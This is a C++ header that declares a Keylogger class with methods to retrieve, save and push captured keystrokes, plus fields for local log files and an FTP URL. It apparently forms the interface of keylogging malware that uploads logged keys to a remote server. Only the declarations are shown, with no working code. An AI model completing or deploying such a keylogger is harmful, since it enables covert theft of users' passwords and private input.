#include <string>
#include <fstream>

class Keylogger
{
	public:
		Keylogger(std::string logFile, std::string ftpURL);
		~Keylogger();
		void retrieveKeys();
		std::string getKeys();
		void saveKeys();
		void pushKeys();

	private:
		std::string _keys;
		std::string _logFile;
		std::fstream _logFileStream;
		std::string _tmpLogFile;
		std::fstream _tmpLogFileStream;
		std::string _ftpURL;
		std::string _path;

};